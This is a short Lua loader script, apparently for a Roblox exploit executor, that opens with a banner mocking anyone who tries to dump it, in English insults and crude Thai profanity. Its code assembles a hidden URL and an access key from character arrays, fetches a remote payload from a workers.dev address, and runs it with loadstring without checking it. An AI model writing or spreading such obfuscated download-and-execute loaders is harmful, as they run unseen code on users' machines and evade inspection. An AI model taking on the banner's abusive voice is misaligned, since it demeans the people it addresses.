
--[[
========================================================================================
🤡 HAHAHAHAHA! YOU REALLY THOUGHT YOU COULD DUMP THIS? 🤡
Stupid bot! You just dumped a useless dummy loader! LMAO. 
You got absolutely NOTHING from my server! Try harder next time, skid! 🖕

ไอ้ควายยยยยย 🤣 คิดว่าใช้บอทดึงแล้วจะได้สคริปต์กูไปหรอ โง่จัดดดดด!
มึงได้ไปแค่คำด่าแหละไอ้สัสสสสสสส กลับไปนอนดูดนมแม่ไป๊ ไม่มีทางเจาะโค้ดกูได้หรอกไอ้กระจอก! 🍼👶
========================================================================================
]]

print("🤡 Dumbass bot trying to dump my script LMAO 🤡")
print("🤣 ควายเอ้ย ได้ไปแค่ Loader โง่ๆ 🤣")

local _u = {'h','t','t','p','s',':','/','/','p','r','o','x','y','-','h','u','b','v','1','.','w','h','o','s','h','o','p','0','0','3','.','w','o','r','k','e','r','s','.','d','e','v','/','a','p','i','/','g','e','t','_','p','a','y','l','o','a','d'}
local _k = {'p','r','o','x','y','h','u','b','_','u','l','t','r','a','_','s','e','c','u','r','e','_','9','9','9'}
local u = table.concat(_u)
local k = table.concat(_k)

local req = request or http_request or (http and http.request) or syn.request
if req then
    local res = req({
        Url = u,
        Method = "GET",
        Headers = { ["X-Loader-Auth"] = k }
    })
    
    if res.StatusCode == 200 then
        local func = loadstring(res.Body)
        if func then 
            func() 
        else
            warn("Error compiling script.")
        end
    end
end
    